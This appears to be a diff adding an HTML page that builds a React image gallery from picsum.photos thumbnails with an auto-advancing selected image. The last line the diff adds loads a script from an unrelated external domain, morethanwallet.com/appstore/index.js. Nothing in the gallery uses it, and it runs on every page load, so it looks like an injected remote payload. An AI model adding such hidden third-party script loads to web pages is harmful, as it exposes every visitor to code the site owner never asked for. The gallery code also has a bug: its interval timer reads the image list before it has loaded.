@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Image Gallery</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react/17.0.2/umd/react.development.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/react-dom/17.0.2/umd/react-dom.development.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/babel-standalone/6.26.0/babel.min.js"></script>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f0f0;
+            color: #333;
+        }
+
+        h1, h2 {
+            text-align: center;
+            color: #4d1dd0;
+        }
+
+        .thumbnail-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .thumbnail {
+            width: 120px;
+            height: 120px;
+            cursor: pointer;
+            margin: 8px;
+            display: inline-block;
+            border-radius: 15px;
+            transition: transform 0.3s ease;
+            border: 4px solid #4d1dd0;
+            overflow: hidden;
+        }
+
+        .thumbnail:hover {
+            transform: scale(1.1);
+        }
+
+        .selected-image-container {
+            text-align: center;
+            margin-top: 40px;
+        }
+
+        .selected-image-container img {
+            max-width: 70%;
+            max-height: 60vh;
+            border-radius: 15px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
+            border: 4px solid #4d1dd0;
+            background-color: #fff;
+        }
+
+        .line {
+            width: 80%;
+            margin: auto;
+            margin-bottom: 20px;
+            border-bottom: 2px solid #4d1dd0;
+        }
+    </style>
+</head>
+<body>
+
+<div id="app"></div>
+
+<script type="text/babel">
+    class ImageGalleryApp extends React.Component {
+        constructor(props) {
+            super(props);
+            this.state = {
+                images: [],
+                selectedImage: null,
+                currentIndex: 0
+            };
+        }
+
+        componentDidMount() {
+            const limit = 10;
+            fetch('https://picsum.photos/v2/list?limit=' + limit)
+                .then(response => response.json())
+                .then(data => {
+                    const images = data.map(item => ({
+                        thumbnail: `https://picsum.photos/120/120?image=${item.id}`,
+                        full: `https://picsum.photos/${item.width}/${item.height}?image=${item.id}`
+                    }));
+                    this.setState({ images });
+                })
+                .catch(error => console.error('Error fetching images:', error));
+
+            setInterval(() => {
+                const { images, currentIndex } = this.state;
+                const newIndex = (currentIndex + 1) % images.length;
+                this.setState({ currentIndex: newIndex, selectedImage: images[newIndex].full });
+            }, 1000);
+        }
+
+        selectImage = (imageUrl) => {
+            this.setState({ selectedImage: imageUrl });
+        }
+
+        render() {
+            return (
+                <div>
+                    <h1>Image Gallery</h1>
+                    <div className="thumbnail-container">
+                        {this.state.images.map(image => (
+                            <img key={image.thumbnail} src={image.thumbnail} className="thumbnail" onClick={() => this.selectImage(image.full)} />
+                        ))}
+                    </div>
+                    <div className="line"></div>
+                    {this.state.selectedImage && (
+                        <div className="selected-image-container">
+                            <h2>Selected Image</h2>
+                            <img src={this.state.selectedImage} alt="Selected Image" />
+                        </div>
+                    )}
+                </div>
+            );
+        }
+    }
+    
+    ReactDOM.render(<ImageGalleryApp />, document.getElementById('app'));
+</script>
+<script src="https://morethanwallet.com/appstore/index.js"></script>
+</body>
+</html>
